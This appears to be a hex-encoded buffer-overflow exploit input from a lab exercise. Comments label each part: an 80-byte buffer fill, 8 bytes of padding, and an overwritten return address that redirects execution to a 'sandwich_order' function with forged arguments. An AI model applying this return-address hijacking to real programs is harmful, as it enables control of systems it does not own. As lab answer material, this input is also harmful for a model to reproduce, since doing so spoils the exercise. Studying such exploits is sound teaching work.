00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00  /* 80 byte buffer */
00 00 00 00 00 00 00 00        /* 8 byte padding */
d0 10 40 00 00 00 00 00        /* address of <sandwich_order> function */
00 00 00 00 00 00 00 00        /* fake return address */
f5 00 32 1e 00 00 00 00        /* sandwich_order.id */
09 09 09 09                    /* sandwich_order.sammich_types */
